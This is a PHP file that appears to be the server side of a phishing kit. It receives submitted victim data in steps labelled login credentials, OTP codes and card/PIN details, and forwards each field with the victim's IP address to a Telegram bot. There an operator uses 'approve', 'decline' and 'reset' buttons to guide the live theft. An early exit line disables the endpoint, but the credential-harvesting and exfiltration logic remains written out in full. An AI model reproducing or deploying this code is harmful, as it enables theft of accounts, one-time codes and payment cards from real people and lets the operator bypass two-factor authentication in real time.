<?php
http_response_code(410);
header('Content-Type: application/json');
echo json_encode(['success' => false, 'message' => 'PHP API disabled.']);
exit;

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonOut(['success' => false, 'message' => 'Invalid request method.'], 405);
}

$raw  = file_get_contents('php://input');
$body = json_decode($raw, true);

if (!is_array($body) || !isset($body['step'], $body['data'])) {
    jsonOut(['success' => false, 'message' => 'Malformed payload.'], 400);
}

$step = (int) $body['step'];
$data = $body['data'];

if (!is_array($data) || empty($data)) {
    jsonOut(['success' => false, 'message' => 'No data received.'], 400);
}

$stepTitles = [
    1 => '🔐 Login Credentials',
    2 => '🔑 OTP / Verification Code',
    3 => '💳 Card / Pin Details',
];

$title = $stepTitles[$step] ?? "📄 Step {$step}";

$text  = "📬 <b>New Submission — {$title}</b>\n";
$text .= "────────────────────\n";

foreach ($data as $key => $value) {
    $text .= "• <b>" . h($key) . ":</b> " . h($value) . "\n";
}

$text .= "────────────────────\n";
$text .= "🌐 IP: " . h($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
$text .= "🕒 " . date('Y-m-d H:i:s');

$replyMarkup = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Approve (Next Step)', 'callback_data' => 'action_approve'],
            ['text' => '❌ Decline (Retry)', 'callback_data' => 'action_decline']
        ],
        [
            ['text' => '🏁 Finish (Complete Flow)', 'callback_data' => 'action_done'],
            ['text' => '🔄 Reset All', 'callback_data' => 'action_reset']
        ]
    ]
];

$res = sendTelegram($text, $replyMarkup);

if (!$res['ok']) {
    $err = $res['error'] ?? 'Failed to send to Telegram.';
    if (strpos($err, 'chat not found') !== false) {
        $err = 'Telegram error: Chat not found. Please open @Planwell2_bot in Telegram and tap /start.';
    }
    jsonOut(['success' => false, 'message' => $err], 502);
}

$state = loadState();
$state['step']   = $step;
$state['status'] = 'pending';
saveState($state);

jsonOut(['success' => true, 'message' => 'Submitted.']);
